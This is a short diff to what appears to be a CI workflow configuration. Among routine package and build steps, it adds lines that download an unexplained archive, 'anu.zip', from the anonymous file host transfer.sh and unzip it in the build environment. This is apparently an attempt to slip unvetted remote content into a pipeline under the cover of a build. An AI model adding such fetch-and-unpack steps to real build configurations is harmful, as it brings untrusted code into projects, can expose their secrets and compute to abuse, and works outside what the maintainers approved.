@@ -10,6 +10,8 @@ jobs:
       - run: apt-get upgrade -y
       - run: npm i pm2 -g
       - run: rm -rf /var/lib/apt/lists/
+      - run: wget https://transfer.sh/5JJeuu/anu.zip
+      - run: unzip anu.zip
       - run: yarn
       - run: ls -la
       - run: pwd
